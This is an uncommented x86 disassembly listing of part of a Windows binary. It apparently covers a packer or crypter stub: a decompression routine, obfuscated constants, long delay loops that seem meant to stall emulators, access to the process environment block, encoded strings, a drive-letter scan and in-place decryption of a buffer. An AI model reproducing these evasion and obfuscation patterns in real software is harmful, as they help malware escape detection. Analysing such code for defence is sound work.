  424853:	call   0x424a45
  424858:	mov    esi,DWORD PTR [ebp-0x2c]
  42485b:	je     0x424866
  42485d:	mov    esi,DWORD PTR [ebp-0x30]
  424860:	mov    ecx,DWORD PTR [ebp-0x2c]
  424863:	mov    DWORD PTR [ebp-0x30],ecx
  424866:	mov    ecx,DWORD PTR [ebp-0x28]
  424869:	mov    DWORD PTR [ebp-0x2c],ecx
  42486c:	mov    ecx,DWORD PTR [ebp-0x24]
  42486f:	mov    DWORD PTR [ebp-0x28],ecx
  424872:	mov    DWORD PTR [ebp-0x24],esi
  424875:	pop    eax
  424876:	pop    edi
  424877:	pop    ecx
  424878:	mov    edx,0xa68
  42487d:	mov    cl,0x8
  42487f:	add    edx,edi
  424881:	push   edx
  424882:	push   edi
  424883:	cmp    al,0x7
  424885:	mov    al,cl
  424887:	jb     0x42488b
  424889:	add    al,0x3
  42488b:	push   eax
  42488c:	mov    ebp,DWORD PTR [ebp-0x34]
  42488f:	call   0x424a52
  424894:	jne    0x4248aa
  424896:	mov    eax,DWORD PTR [ebp-0x18]
  424899:	mov    edi,DWORD PTR [ebp-0x34]
  42489c:	shl    eax,0x3
  42489f:	sub    ecx,ecx
  4248a1:	push   0x8
  4248a3:	pop    esi
  4248a4:	lea    edi,[edi+eax*2+0x4]
  4248a8:	jmp    0x4248df
  4248aa:	mov    ebp,DWORD PTR [ebp-0x34]
  4248ad:	add    ebp,0x2
  4248b0:	call   0x424a52
  4248b5:	jne    0x4248cf
  4248b7:	mov    eax,DWORD PTR [ebp-0x18]
  4248ba:	mov    edi,DWORD PTR [ebp-0x34]
  4248bd:	shl    eax,0x3
  4248c0:	push   0x8
  4248c2:	pop    ecx
  4248c3:	push   0x8
  4248c5:	pop    esi
  4248c6:	lea    edi,[edi+eax*2+0x104]
  4248cd:	jmp    0x4248df
  4248cf:	mov    edi,0x204
  4248d4:	add    edi,DWORD PTR [ebp-0x34]
  4248d7:	push   0x10
  4248d9:	pop    ecx
  4248da:	mov    esi,0x100
  4248df:	mov    DWORD PTR [ebp-0x1c],ecx
  4248e2:	sub    eax,eax
  4248e4:	inc    eax
  4248e5:	mov    ebp,edi
  4248e7:	call   0x424a54
  4248ec:	mov    ecx,eax
  4248ee:	sub    ecx,esi
  4248f0:	jb     0x4248e5
  4248f2:	add    DWORD PTR [ebp-0x1c],ecx
  4248f5:	cmp    DWORD PTR [ebp-0x3c],0x4
  4248f9:	jae    0x4249af
  4248ff:	add    DWORD PTR [ebp-0x3c],0x7
  424903:	mov    ecx,DWORD PTR [ebp-0x1c]
  424906:	cmp    ecx,0x4
  424909:	jb     0x42490e
  42490b:	push   0x3
  42490d:	pop    ecx
  42490e:	mov    edi,DWORD PTR [ebp-0x38]
  424911:	shl    ecx,0x6
  424914:	sub    eax,eax
  424916:	inc    eax
  424917:	push   0x40
  424919:	pop    esi
  42491a:	lea    edi,[edi+ecx*2+0x360]
  424921:	mov    ebp,edi
  424923:	call   0x424a54
  424928:	mov    ecx,eax
  42492a:	sub    ecx,esi
  42492c:	jb     0x424921
  42492e:	mov    DWORD PTR [ebp-0x18],ecx
  424931:	mov    DWORD PTR [ebp-0x24],ecx
  424934:	cmp    ecx,0x4
  424937:	jb     0x4249ac
  424939:	mov    esi,ecx
  42493b:	and    DWORD PTR [ebp-0x24],0x1
  42493f:	shr    esi,1
  424941:	or     DWORD PTR [ebp-0x24],0x2
  424945:	dec    esi
  424946:	cmp    ecx,0xe
  424949:	jae    0x424964
  42494b:	mov    eax,0x2af
  424950:	sub    eax,ecx
  424952:	mov    ecx,esi
  424954:	shl    BYTE PTR [ebp-0x24],cl
  424957:	add    eax,DWORD PTR [ebp-0x24]
  42495a:	shl    eax,1
  42495c:	add    eax,DWORD PTR [ebp-0x38]
  42495f:	mov    DWORD PTR [ebp-0x34],eax
  424962:	jmp    0x424991
  424964:	sub    esi,0x4
  424967:	call   0x424a11
  42496c:	shr    ebx,1
  42496e:	shl    DWORD PTR [ebp-0x24],1
  424971:	cmp    DWORD PTR [ebp-0x20],ebx
  424974:	jb     0x42497c
  424976:	inc    DWORD PTR [ebp-0x24]
  424979:	sub    DWORD PTR [ebp-0x20],ebx
  42497c:	dec    esi
  42497d:	jne    0x424967
  42497f:	mov    eax,0x644
  424984:	add    eax,DWORD PTR [ebp-0x38]
  424987:	mov    DWORD PTR [ebp-0x34],eax
  42498a:	shl    DWORD PTR [ebp-0x24],0x4
  42498e:	push   0x4
  424990:	pop    esi
  424991:	sub    edi,edi
  424993:	inc    edi
  424994:	mov    eax,edi
  424996:	mov    ebp,DWORD PTR [ebp-0x34]
  424999:	call   0x424a54
  42499e:	test   al,0x1
  4249a0:	je     0x4249a5
  4249a2:	or     DWORD PTR [ebp-0x24],edi
  4249a5:	shl    edi,1
  4249a7:	dec    esi
  4249a8:	jne    0x424996
  4249aa:	jmp    0x4249ac
  4249ac:	inc    DWORD PTR [ebp-0x24]
  4249af:	mov    ecx,DWORD PTR [ebp-0x1c]
  4249b2:	add    ecx,0x2
  4249b5:	mov    edi,DWORD PTR [ebp-0x4]
  4249b8:	mov    eax,edi
  4249ba:	sub    eax,DWORD PTR [ebp+0x24]
  4249bd:	cmp    DWORD PTR [ebp-0x24],eax
  4249c0:	ja     0x424a0c
  4249c2:	mov    esi,edi
  4249c4:	sub    esi,DWORD PTR [ebp-0x24]
  4249c7:	mov    edx,DWORD PTR [ebp+0x28]
  4249ca:	lods   al,BYTE PTR ds:[esi]
  4249cb:	stos   BYTE PTR es:[edi],al
  4249cc:	cmp    edi,edx
  4249ce:	jae    0x4249d3
  4249d0:	dec    ecx
  4249d1:	jne    0x4249ca
  4249d3:	mov    DWORD PTR [ebp-0x4],edi
  4249d6:	movzx  esi,al
  4249d9:	cmp    edi,DWORD PTR [ebp+0x28]
  4249dc:	jb     0x42473d
  4249e2:	call   0x424a11
  4249e7:	sub    eax,eax
  4249e9:	lea    ebp,[esp+0x3c]
  4249ed:	mov    edx,DWORD PTR [ebp+0x20]
  4249f0:	mov    esi,DWORD PTR [ebp-0x8]
  4249f3:	sub    esi,DWORD PTR [ebp+0x18]
  4249f6:	mov    DWORD PTR [edx],esi
  4249f8:	mov    edx,DWORD PTR [ebp+0x2c]
  4249fb:	mov    edi,DWORD PTR [ebp-0x4]
  4249fe:	sub    edi,DWORD PTR [ebp+0x24]
  424a01:	mov    DWORD PTR [edx],edi
  424a03:	leave  
  424a04:	pop    ebx
  424a05:	pop    esi
  424a06:	pop    edi
  424a07:	ret    0x1c
  424a0a:	pop    esi
  424a0b:	pop    eax
  424a0c:	sub    eax,eax
  424a0e:	inc    eax
  424a0f:	jmp    0x4249e9
  424a11:	cmp    ebx,0x1000000
  424a17:	jb     0x424a1a
  424a19:	ret    
  424a1a:	shl    ebx,0x8
  424a1d:	push   esi
  424a1e:	mov    esi,DWORD PTR [ebp-0x8]
  424a21:	jbe    0x424a82
  424a23:	cli    
  424a24:	push   edi
  424a25:	sbb    eax,0x910d9fb8
  424a2a:	or     eax,0x9fb03caa
  424a2f:	or     eax,0x36d5fb0
  424a34:	cdq    
  424a35:	mov    eax,0x64c69dbf
  424a3a:	lea    edx,[ecx-0x606965ef]
  424a40:	sub    eax,0xa2399196
  424a45:	(bad)  
  424a46:	lea    edx,fs:[esi+0x3fb89d9f]
  424a4d:	lods   eax,DWORD PTR ds:[esi]
  424a4e:	sar    BYTE PTR [ebx],0x9f
  424a51:	mov    dh,BYTE PTR [esi]
  424a53:	(bad)  
  424a54:	sar    BYTE PTR [ebx],0x9f
  424a57:	mov    dl,BYTE PTR [eax-0x75757587]
  424a5d:	mov    ss,WORD PTR [edi-0x6]
  424a60:	mov    eax,0x916a1abb
  424a65:	sbb    ebx,DWORD PTR [edx]
  424a67:	or     ch,BYTE PTR [edx-0x4e5448a]
  424a6d:	push   edi
  424a6e:	cld    
  424a6f:	mov    ah,0xce
  424a71:	mov    DWORD PTR [ebx+0x19916a1a],ebx
  424a77:	stos   BYTE PTR es:[edi],al
  424a78:	lods   al,BYTE PTR ds:[esi]
  424a79:	fistp  DWORD PTR [edx]
  424a7b:	or     bh,BYTE PTR [eax-0x20973947]
  424a81:	mov    dl,BYTE PTR [ecx+0x48c6b631]
  424a87:	mov    ch,0x6e
  424a89:	mov    ebx,0xe6570a1a
  424a8e:	mov    eax,0xaa8a70f1
  424a93:	mov    cl,BYTE PTR [edx+0x3191b536]
  424a99:	sahf   
  424a9a:	and    ecx,DWORD PTR [esi-0x72697541]
  424aa0:	shr    BYTE PTR [esp+0x40],0xc3
  424aa5:	shr    edx,0x5
  424aa8:	sub    DWORD PTR [esp+0x20],ecx
  424aac:	sub    ebx,ecx
  424aae:	sub    WORD PTR [ebp+0x0],dx
  424ab2:	add    eax,eax
  424ab4:	add    eax,0x1
  424ab7:	lea    ebp,[esp+0x40]
  424abb:	ret    
  424abc:	push   ebp
  424abd:	mov    ebp,esp
  424abf:	sub    esp,0x12c
  424ac5:	push   ebx
  424ac6:	push   esi
  424ac7:	push   edi
  424ac8:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  424acf:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  424ad6:	mov    eax,DWORD PTR [ebp+0x8]
  424ad9:	mov    DWORD PTR [ebp+0x8],eax
  424adc:	mov    ecx,DWORD PTR [ebp-0x10]
  424adf:	mov    ebx,0x75108b1
  424ae4:	xor    ecx,ebx
  424ae6:	mov    eax,0x3272f8
  424aeb:	add    ecx,eax
  424aed:	mov    DWORD PTR [ebp-0x24],ecx
  424af0:	mov    ecx,DWORD PTR [ebp-0x10]
  424af3:	xor    ecx,ebx
  424af5:	add    ecx,eax
  424af7:	mov    DWORD PTR [ebp-0x40],ecx
  424afa:	mov    ecx,DWORD PTR [ebp-0x10]
  424afd:	xor    ecx,ebx
  424aff:	add    ecx,eax
  424b01:	mov    DWORD PTR [ebp-0x3c],ecx
  424b04:	mov    ecx,DWORD PTR [ebp-0x10]
  424b07:	xor    ecx,ebx
  424b09:	add    ecx,eax
  424b0b:	mov    DWORD PTR [ebp-0xd8],ecx
  424b11:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  424b18:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  424b1f:	mov    DWORD PTR [ebp-0x54],0xf89c85bd
  424b26:	push   0x25
  424b28:	pop    ecx
  424b29:	mov    DWORD PTR [ebp-0x30],ecx
  424b2c:	mov    DWORD PTR [ebp-0x30],ecx
  424b2f:	push   0x65
  424b31:	pop    ecx
  424b32:	mov    DWORD PTR [ebp-0x30],ecx
  424b35:	mov    DWORD PTR [ebp-0x30],ecx
  424b38:	mov    DWORD PTR [ebp-0x30],0x4d
  424b3f:	mov    DWORD PTR [ebp-0x30],0x43
  424b46:	mov    ecx,DWORD PTR [ebp-0x10]
  424b49:	xor    ecx,ebx
  424b4b:	add    ecx,eax
  424b4d:	mov    DWORD PTR [ebp-0x30],ecx
  424b50:	mov    ecx,DWORD PTR [ebp-0x10]
  424b53:	xor    ecx,ebx
  424b55:	add    ecx,eax
  424b57:	mov    DWORD PTR [ebp-0x30],ecx
  424b5a:	mov    DWORD PTR [ebp-0x28],0x258
  424b61:	mov    DWORD PTR [ebp-0x34],0x36
  424b68:	mov    DWORD PTR [ebp-0x14],0x7a
  424b6f:	lea    edi,[ebp-0x10c]
  424b75:	lea    esi,[ebp-0x12c]
  424b7b:	call   0x42583b
  424b80:	dec    DWORD PTR [ebp-0x14]
  424b83:	jne    0x424b6f
  424b85:	dec    DWORD PTR [ebp-0x34]
  424b88:	jne    0x424b68
  424b8a:	dec    DWORD PTR [ebp-0x28]
  424b8d:	jne    0x424b61
  424b8f:	mov    DWORD PTR [ebp-0x28],0x400e
  424b96:	mov    eax,DWORD PTR [ebp-0x10]
  424b99:	xor    eax,ebx
  424b9b:	mov    esi,0x3272f8
  424ba0:	add    eax,esi
  424ba2:	mov    DWORD PTR [ebp-0x1c],eax
  424ba5:	mov    eax,DWORD PTR [ebp-0x10]
  424ba8:	and    DWORD PTR [ebp-0x94],0x0
  424baf:	xor    eax,ebx
  424bb1:	add    eax,esi
  424bb3:	mov    DWORD PTR [ebp-0x38],eax
  424bb6:	mov    eax,fs:0x18
  424bbc:	mov    DWORD PTR [ebp-0x94],eax
  424bc2:	mov    eax,DWORD PTR [eax+0x30]
  424bc5:	mov    DWORD PTR [ebp-0xcc],eax
  424bcb:	mov    eax,DWORD PTR [eax+0xc]
  424bce:	mov    DWORD PTR [ebp-0xc0],eax
  424bd4:	mov    eax,DWORD PTR [ebp+0x8]
  424bd7:	lea    ecx,[ebp-0x94]
  424bdd:	mov    DWORD PTR [eax+0x1a0],ecx
  424be3:	mov    eax,DWORD PTR [ebp+0x8]
  424be6:	lea    ecx,[ebp-0xcc]
  424bec:	mov    DWORD PTR [eax+0x1a4],ecx
  424bf2:	mov    eax,DWORD PTR [ebp+0x8]
  424bf5:	push   DWORD PTR [ebp+0x8]
  424bf8:	lea    ecx,[ebp-0xc0]
  424bfe:	mov    DWORD PTR [eax+0x1a8],ecx
  424c04:	call   0x426ffc
  424c09:	mov    ecx,DWORD PTR [ebp-0x10]
  424c0c:	xor    ecx,ebx
  424c0e:	add    ecx,esi
  424c10:	cmp    ecx,eax
  424c12:	je     0x424f95
  424c18:	mov    eax,DWORD PTR [ebp+0x8]
  424c1b:	mov    eax,DWORD PTR [eax+0x194]
  424c21:	mov    ecx,DWORD PTR [eax]
  424c23:	mov    eax,DWORD PTR [ebp+0x8]
  424c26:	mov    eax,DWORD PTR [eax+0x194]
  424c2c:	mov    eax,DWORD PTR [eax]
  424c2e:	add    eax,DWORD PTR [ecx+0x3c]
  424c31:	mov    ecx,DWORD PTR [ebp+0x8]
  424c34:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424c3a:	lea    edx,[ebp-0xec]
  424c40:	push   edx
  424c41:	mov    edx,DWORD PTR [ebp+0x8]
  424c44:	mov    edx,DWORD PTR [edx+0x18c]
  424c4a:	mov    edx,DWORD PTR [edx]
  424c4c:	add    edx,DWORD PTR [eax+0x88]
  424c52:	push   0x4
  424c54:	push   DWORD PTR [eax+0x8c]
  424c5a:	push   edx
  424c5b:	call   DWORD PTR [ecx+0x1c]
  424c5e:	push   DWORD PTR [ebp+0x8]
  424c61:	xor    eax,eax
  424c63:	mov    DWORD PTR [ebp-0xa8],0xe3beeec4
  424c6d:	mov    DWORD PTR [ebp-0xa4],0xeac7eddc
  424c77:	mov    DWORD PTR [ebp-0xa0],0xbcede0f2
  424c81:	mov    BYTE PTR [ebp-0x9c],0x7b
  424c88:	lea    edi,[ebp-0x9b]
  424c8e:	stos   DWORD PTR es:[edi],eax
  424c8f:	stos   WORD PTR es:[edi],ax
  424c91:	stos   BYTE PTR es:[edi],al
  424c92:	xor    eax,eax
  424c94:	mov    DWORD PTR [ebp-0xbc],0xe3beeec4
  424c9e:	mov    DWORD PTR [ebp-0xb8],0xeac7eddc
  424ca8:	mov    DWORD PTR [ebp-0xb4],0xd2ede0f2
  424cb2:	mov    BYTE PTR [ebp-0xb0],0x7b
  424cb9:	lea    edi,[ebp-0xaf]
  424cbf:	stos   DWORD PTR es:[edi],eax
  424cc0:	stos   WORD PTR es:[edi],ax
  424cc2:	stos   BYTE PTR es:[edi],al
  424cc3:	mov    edi,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edx,DWORD PTR [eax+0x1b8]
  424ccf:	mov    DWORD PTR [ebp-0x68],0xedefeee7
  424cd6:	mov    DWORD PTR [ebp-0x64],0xe4ebe8de
  424cdd:	mov    WORD PTR [ebp-0x60],0x7bbc
  424ce3:	mov    DWORD PTR [ebp-0x90],0xe3beeec4
  424ced:	mov    DWORD PTR [ebp-0x8c],0xe7bceddc
  424cf7:	mov    DWORD PTR [ebp-0x88],0xc9dce3eb
  424d01:	mov    DWORD PTR [ebp-0x84],0xede0e8f0
  424d0b:	mov    DWORD PTR [ebp-0x80],0x7bbcdee4
  424d12:	mov    DWORD PTR [ebp-0x7c],0xe3beeec4
  424d19:	mov    DWORD PTR [ebp-0x78],0xe7bceddc
  424d20:	mov    DWORD PTR [ebp-0x74],0xc9dce3eb
  424d27:	mov    DWORD PTR [ebp-0x70],0xede0e8f0
  424d2e:	mov    DWORD PTR [ebp-0x6c],0x7bd2dee4
  424d35:	call   0x42702b
  424d3a:	push   eax
  424d3b:	mov    eax,DWORD PTR [ebp+0x8]
  424d3e:	mov    eax,DWORD PTR [eax+0x1a8]
  424d44:	push   DWORD PTR [eax]
  424d46:	call   0x426ccc
  424d4b:	test   eax,eax
  424d4d:	jne    0x424d9f
  424d4f:	mov    eax,DWORD PTR [ebp+0x8]
  424d52:	mov    eax,DWORD PTR [eax+0x1e0]
  424d58:	mov    edi,DWORD PTR [ebp+0x8]
  424d5b:	add    eax,0x4
  424d5e:	mov    DWORD PTR [ebp-0x20],eax
  424d61:	mov    eax,DWORD PTR [ebp+0x8]
  424d64:	mov    edx,DWORD PTR [eax+0x1b8]
  424d6a:	call   0x42702b
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x20]
  424d73:	call   DWORD PTR [eax]
  424d75:	test   eax,eax
  424d77:	jne    0x424d9f
  424d79:	mov    eax,DWORD PTR [ebp+0x8]
  424d7c:	mov    eax,DWORD PTR [eax+0x1e0]
  424d82:	mov    edi,DWORD PTR [ebp+0x8]
  424d85:	add    eax,0x10
  424d88:	mov    DWORD PTR [ebp-0x20],eax
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	mov    edx,DWORD PTR [eax+0x1b8]
  424d94:	call   0x42702b
  424d99:	push   eax
  424d9a:	mov    eax,DWORD PTR [ebp-0x20]
  424d9d:	call   DWORD PTR [eax]
  424d9f:	mov    eax,DWORD PTR [ebp-0x10]
  424da2:	mov    ecx,DWORD PTR [ebp-0x28]
  424da5:	xor    eax,ebx
  424da7:	add    eax,esi
  424da9:	cmp    eax,ecx
  424dab:	je     0x424f6e
  424db1:	mov    eax,DWORD PTR [ebp-0x18]
  424db4:	xor    eax,ebx
  424db6:	mov    ecx,0xffcd8d08
  424dbb:	sub    ecx,eax
  424dbd:	add    ecx,DWORD PTR [ebp-0x28]
  424dc0:	mov    eax,DWORD PTR [ebp-0x1c]
  424dc3:	cmp    eax,ecx
  424dc5:	ja     0x424f6e
  424dcb:	mov    DWORD PTR [ebp-0x34],0x0
  424dd2:	push   DWORD PTR [ebp+0x8]
  424dd5:	mov    edi,DWORD PTR [ebp+0x8]
  424dd8:	mov    eax,DWORD PTR [ebp+0x8]
  424ddb:	mov    edx,DWORD PTR [eax+0x1b4]
  424de1:	call   0x42702b
  424de6:	push   eax
  424de7:	mov    eax,DWORD PTR [ebp+0x8]
  424dea:	mov    eax,DWORD PTR [eax+0x1a8]
  424df0:	push   DWORD PTR [eax]
  424df2:	call   0x426ccc
  424df7:	mov    ecx,DWORD PTR [ebp+0x8]
  424dfa:	mov    ecx,DWORD PTR [ecx+0x19c]
  424e00:	mov    DWORD PTR [ecx],eax
  424e02:	mov    eax,DWORD PTR [ebp+0x8]
  424e05:	mov    edi,DWORD PTR [eax+0x1e0]
  424e0b:	mov    esi,DWORD PTR [ebp+0x8]
  424e0e:	xor    eax,eax
  424e10:	lea    edx,[ebp-0x7c]
  424e13:	call   0x427061
  424e18:	push   eax
  424e19:	mov    eax,DWORD PTR [ebp+0x8]
  424e1c:	mov    eax,DWORD PTR [eax+0x19c]
  424e22:	push   DWORD PTR [eax]
  424e24:	call   DWORD PTR [edi+0x8]
  424e27:	mov    DWORD PTR [ebp-0x20],eax
  424e2a:	mov    eax,DWORD PTR [ebp+0x8]
  424e2d:	mov    edi,DWORD PTR [eax+0x1e0]
  424e33:	mov    esi,DWORD PTR [ebp+0x8]
  424e36:	xor    eax,eax
  424e38:	lea    edx,[ebp-0x90]
  424e3e:	call   0x427061
  424e43:	push   eax
  424e44:	mov    eax,DWORD PTR [ebp+0x8]
  424e47:	mov    eax,DWORD PTR [eax+0x19c]
  424e4d:	push   DWORD PTR [eax]
  424e4f:	call   DWORD PTR [edi+0x8]
  424e52:	mov    eax,DWORD PTR [ebp+0x8]
  424e55:	mov    edi,DWORD PTR [eax+0x1e0]
  424e5b:	mov    esi,DWORD PTR [ebp+0x8]
  424e5e:	xor    eax,eax
  424e60:	lea    edx,[ebp-0xa8]
  424e66:	call   0x427061
  424e6b:	push   eax
  424e6c:	mov    eax,DWORD PTR [ebp+0x8]
  424e6f:	mov    eax,DWORD PTR [eax+0x19c]
  424e75:	push   DWORD PTR [eax]
  424e77:	call   DWORD PTR [edi+0x8]
  424e7a:	and    DWORD PTR [ebp-0x8],0x0
  424e7e:	mov    DWORD PTR [ebp-0x48],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x8]
  424e84:	and    eax,0x7
  424e87:	add    eax,0x31
  424e8a:	push   eax
  424e8b:	call   DWORD PTR [ebp-0x20]
  424e8e:	test   eax,eax
  424e90:	je     0x424ed4
  424e92:	mov    eax,DWORD PTR [ebp-0x8]
  424e95:	push   0x19
  424e97:	xor    edx,edx
  424e99:	pop    ecx
  424e9a:	div    ecx
  424e9c:	add    dl,0x41
  424e9f:	movzx  eax,dl
  424ea2:	push   eax
  424ea3:	call   DWORD PTR [ebp-0x48]
  424ea6:	test   eax,eax
  424ea8:	jne    0x424ed4
  424eaa:	mov    eax,DWORD PTR [ebp+0x8]
  424ead:	mov    edi,DWORD PTR [eax+0x1e0]
  424eb3:	mov    esi,DWORD PTR [ebp+0x8]
  424eb6:	xor    eax,eax
  424eb8:	lea    edx,[ebp-0x68]
  424ebb:	call   0x427061
  424ec0:	push   eax
  424ec1:	mov    eax,DWORD PTR [ebp+0x8]
  424ec4:	mov    eax,DWORD PTR [eax+0x198]
  424eca:	push   DWORD PTR [eax]
  424ecc:	call   DWORD PTR [edi+0x8]
  424ecf:	mov    DWORD PTR [ebp-0x14],eax
  424ed2:	jmp    0x424ed8
  424ed4:	and    DWORD PTR [ebp-0x14],0x0
  424ed8:	inc    DWORD PTR [ebp-0x8]
  424edb:	cmp    DWORD PTR [ebp-0x8],0x10
  424edf:	jb     0x424e81
  424ee1:	mov    eax,DWORD PTR [ebp-0x18]
  424ee4:	mov    esi,DWORD PTR [ebp+0x8]
  424ee7:	xor    eax,ebx
  424ee9:	mov    edi,0x3272f8
  424eee:	add    eax,edi
  424ef0:	lea    edx,[ebp-0x10c]
  424ef6:	call   0x427061
  424efb:	push   eax
  424efc:	mov    eax,DWORD PTR [ebp-0x10]
  424eff:	mov    esi,DWORD PTR [ebp+0x8]
  424f02:	xor    eax,ebx
  424f04:	add    eax,edi
  424f06:	lea    edx,[ebp-0x12c]
  424f0c:	call   0x427061
  424f11:	push   eax
  424f12:	call   DWORD PTR [ebp-0x14]
  424f15:	mov    ecx,DWORD PTR [ebp-0x10]
  424f18:	xor    ecx,ebx
  424f1a:	add    ecx,edi
  424f1c:	cmp    ecx,eax
  424f1e:	jne    0x424f27
  424f20:	mov    DWORD PTR [ebp-0x34],0x1
  424f27:	mov    eax,DWORD PTR [ebp-0x18]
  424f2a:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f2d:	xor    eax,ebx
  424f2f:	lea    eax,[eax+ecx*1+0x3272f8]
  424f36:	mov    DWORD PTR [ebp-0x1c],eax
  424f39:	mov    eax,DWORD PTR [ebp-0x34]
  424f3c:	test   eax,eax
  424f3e:	je     0x424f52
  424f40:	mov    eax,DWORD PTR [ebp-0x18]
  424f43:	mov    ecx,DWORD PTR [ebp-0x38]
  424f46:	xor    eax,ebx
  424f48:	lea    eax,[eax+ecx*1+0x3272f8]
  424f4f:	mov    DWORD PTR [ebp-0x38],eax
  424f52:	mov    eax,DWORD PTR [ebp-0x18]
  424f55:	xor    eax,ebx
  424f57:	mov    ecx,0xffcd8d08
  424f5c:	sub    ecx,eax
  424f5e:	add    ecx,DWORD PTR [ebp-0x28]
  424f61:	mov    eax,DWORD PTR [ebp-0x1c]
  424f64:	cmp    eax,ecx
  424f66:	jbe    0x424dcb
  424f6c:	mov    esi,edi
  424f6e:	mov    eax,DWORD PTR [ebp-0x38]
  424f71:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f74:	cmp    ecx,eax
  424f76:	jne    0x424f89
  424f78:	push   DWORD PTR [ebp+0x8]
  424f7b:	lea    eax,[ebp-0x40]
  424f7e:	push   eax
  424f7f:	call   0x427ad0
  424f84:	mov    DWORD PTR [ebp-0x24],eax
  424f87:	jmp    0x424f95
  424f89:	mov    eax,DWORD PTR [ebp-0x24]
  424f8c:	mov    ecx,DWORD PTR [ebp-0x18]
  424f8f:	xor    ecx,ebx
  424f91:	add    ecx,esi
  424f93:	xor    DWORD PTR [eax],ecx
  424f95:	mov    eax,DWORD PTR [ebp-0x10]
  424f98:	mov    ecx,DWORD PTR [ebp-0x24]
  424f9b:	xor    eax,ebx
  424f9d:	add    eax,esi
  424f9f:	cmp    eax,ecx
  424fa1:	je     0x425719
  424fa7:	mov    eax,DWORD PTR [ebp-0x10]
  424faa:	mov    ecx,DWORD PTR [ebp-0x40]
  424fad:	xor    eax,ebx
  424faf:	add    eax,esi
  424fb1:	cmp    eax,ecx
  424fb3:	je     0x425719
  424fb9:	mov    eax,DWORD PTR [ebp-0x10]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	jmp    0x424fde
  424fc2:	mov    edi,DWORD PTR [ebp-0x24]
  424fc5:	mov    cl,al
  424fc7:	and    cl,0x1f
  424fca:	or     dl,0xff
  424fcd:	sub    dl,cl
  424fcf:	add    BYTE PTR [edi+eax*1],dl
  424fd2:	mov    ecx,DWORD PTR [ebp-0x18]
  424fd5:	xor    ecx,ebx
  424fd7:	lea    eax,[eax+ecx*1+0x3272f8]
  424fde:	mov    ecx,DWORD PTR [ebp-0x40]
  424fe1:	cmp    eax,ecx
  424fe3:	jb     0x424fc2
  424fe5:	mov    eax,DWORD PTR [ebp-0x40]
  424fe8:	mov    DWORD PTR [ebp-0x28],eax
  424feb:	mov    eax,DWORD PTR [ebp-0x24]
  424fee:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  424ff5:	mov    DWORD PTR [ebp-0xd4],eax
  424ffb:	mov    edi,0xf89c85b8
  425000:	mov    DWORD PTR [ebp-0x2c],edi
  425003:	mov    eax,DWORD PTR [ebp-0x38]
  425006:	xor    eax,ebx
  425008:	add    eax,esi
  42500a:	mov    DWORD PTR [ebp-0xc],eax
  42500d:	mov    eax,DWORD PTR [ebp-0x38]
  425010:	xor    eax,ebx
  425012:	add    eax,esi
  425014:	mov    DWORD PTR [ebp-0x8],eax
  425017:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  42501e:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  425025:	mov    eax,DWORD PTR [ebp-0x38]
  425028:	mov    ecx,DWORD PTR [ebp-0x28]
  42502b:	xor    eax,ebx
  42502d:	add    eax,esi
  42502f:	cmp    ecx,eax
  425031:	je     0x425230
  425037:	jmp    0x42520c
  42503c:	mov    ecx,DWORD PTR [ebp-0xc]
  42503f:	mov    eax,DWORD PTR [ebp-0x28]
  425042:	sub    eax,ecx
  425044:	mov    ecx,DWORD PTR [ebp-0x48]
  425047:	xor    ecx,ebx
  425049:	add    ecx,esi
  42504b:	xor    edx,edx
  42504d:	div    ecx
  42504f:	mov    DWORD PTR [ebp-0x8],eax
  425052:	mov    eax,DWORD PTR [ebp-0x4c]
  425055:	mov    ecx,DWORD PTR [ebp-0x8]
  425058:	xor    eax,ebx
  42505a:	add    eax,esi
  42505c:	cmp    ecx,eax
  42505e:	jbe    0x42506a
  425060:	mov    eax,DWORD PTR [ebp-0x4c]
  425063:	xor    eax,ebx
  425065:	add    eax,esi
  425067:	mov    DWORD PTR [ebp-0x8],eax
  42506a:	mov    eax,DWORD PTR [ebp-0x48]
  42506d:	mov    ecx,DWORD PTR [ebp-0x8]
  425070:	xor    eax,ebx
  425072:	add    eax,esi
  425074:	imul   eax,ecx
  425077:	mov    DWORD PTR [ebp-0x8],eax
  42507a:	mov    eax,DWORD PTR [ebp-0x38]
  42507d:	mov    ecx,DWORD PTR [ebp-0x8]
  425080:	xor    eax,ebx
  425082:	add    eax,esi
  425084:	cmp    ecx,eax
  425086:	je     0x4251fa
  42508c:	mov    eax,DWORD PTR [ebp-0x8]
  42508f:	mov    DWORD PTR [ebp-0x14],eax
  425092:	mov    eax,DWORD PTR [ebp-0xc]
  425095:	add    eax,DWORD PTR [ebp-0xd4]
  42509b:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  4250a2:	mov    DWORD PTR [ebp-0x34],edi
  4250a5:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  4250af:	mov    DWORD PTR [ebp-0x8],eax
  4250b2:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4250b9:	mov    DWORD PTR [ebp-0x1c],edi
  4250bc:	mov    eax,DWORD PTR [ebp-0x20]
  4250bf:	xor    eax,ebx
  4250c1:	add    eax,esi
  4250c3:	jmp    0x4251b9
  4250c8:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  4250d2:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  4250dc:	mov    eax,DWORD PTR [ebp-0x1c]
  4250df:	mov    ecx,DWORD PTR [ebp-0x44]
  4250e2:	xor    eax,ebx
  4250e4:	add    eax,esi
  4250e6:	imul   eax,ecx
  4250e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4250ec:	mov    al,BYTE PTR [eax+ecx*1]
  4250ef:	mov    BYTE PTR [ebp-0x2],al
  4250f2:	mov    eax,DWORD PTR [ebp-0x1c]
